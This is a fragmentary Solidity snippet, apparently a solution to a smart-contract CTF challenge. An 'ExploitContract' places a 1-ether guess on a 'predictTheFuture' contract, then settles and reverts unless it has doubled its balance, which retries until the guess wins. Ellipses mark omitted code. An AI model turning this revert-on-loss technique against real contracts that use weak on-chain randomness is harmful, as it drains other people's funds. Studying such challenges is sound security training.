...
contract ExploitContract {
    ...
    function answer(uint8 n) public payable {
        require(n <= 9, "n must be less than 10");
        predictTheFuture.lockInGuess{value: 1 ether}(n);
    }
    

    function verifyAnswer() public {
        predictTheFuture.settle();
        require(address(this).balance == 2 ether, "Exploit failed");
    }
